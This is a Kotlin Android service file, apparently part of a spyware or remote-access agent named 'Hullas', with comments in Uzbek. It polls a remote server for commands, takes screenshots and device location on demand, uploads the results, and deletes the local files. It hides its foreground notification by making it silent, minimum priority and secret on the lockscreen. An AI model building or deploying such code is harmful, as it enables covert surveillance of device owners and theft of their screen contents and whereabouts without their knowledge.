package org.hullas.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class HullasService : Service() {
    private val tag = "HullasService"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        try {
            ServiceLifecycleOwner.start()
            startSilentForeground()
            startPolling()
        } catch (e: Exception) {
            Log.e(tag, "Service onCreate crash", e)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onDestroy() {
        pollJob?.cancel()
        scope.cancel()
        ServiceLifecycleOwner.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startSilentForeground() {
        val notification = buildSilentNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(
                    NOTIF_ID, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                )
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, 0)
            } else {
                @Suppress("DEPRECATION")
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(tag, "startForeground fallback", e)
            @Suppress("DEPRECATION")
            startForeground(NOTIF_ID, notification)
        }
    }

    /** Screenshot uchun vaqtincha mediaProjection tipiga o'tish (Android 14+). */
    fun upgradeForScreenshot() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return
        try {
            startForeground(
                NOTIF_ID, buildSilentNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
            )
        } catch (e: Exception) {
            Log.e(tag, "upgradeForScreenshot", e)
        }
    }

    fun downgradeAfterScreenshot() {
        startSilentForeground()
    }

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope.launch {
            val api = ApiClient(this@HullasService)
            val executor = CommandExecutor(this@HullasService)
            var beat = 0
            while (isActive) {
                try {
                    if (beat % 6 == 0) api.heartbeat()
                    beat++
                    val cmd = api.poll()
                    if (cmd != null) {
                        Log.i(tag, "Buyruq: ${cmd.cmd}")
                        handleCommand(api, executor, cmd)
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Poll xato", e)
                }
                delay(10_000)
            }
        }
    }

    private suspend fun handleCommand(
        api: ApiClient,
        executor: CommandExecutor,
        cmd: Command,
    ) {
        if (cmd.cmd == "screenshot") upgradeForScreenshot()
        try {
            val result = executor.execute(cmd)
            result.onSuccess { file ->
                if (cmd.cmd == "location") {
                    api.sendResult(cmd.id, "failed", error = "Not implemented via file")
                    return
                }
                if (file != null) {
                    api.sendResult(cmd.id, "done", file = file)
                    file.delete()
                } else {
                    api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
                }
            }.onFailure { e ->
                if (e is LocationException && e.coords != null) {
                    api.sendResult(
                        cmd.id, "done",
                        lat = e.coords.first, lon = e.coords.second,
                    )
                } else {
                    api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
                }
            }
        } finally {
            if (cmd.cmd == "screenshot") downgradeAfterScreenshot()
        }
    }

    private fun buildSilentNotification(): Notification {
        val channelId = "hullas_silent"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                channelId, "svc", NotificationManager.IMPORTANCE_MIN,
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, channelId)
            .setSmallIcon(R.drawable.ic_stat)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .build()
    }

    companion object {
        const val NOTIF_ID = 1

        fun start(ctx: android.content.Context) {
            try {
                val i = Intent(ctx, HullasService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(i)
                } else {
                    ctx.startService(i)
                }
            } catch (e: Exception) {
                Log.e("HullasService", "start xato", e)
            }
        }
    }
}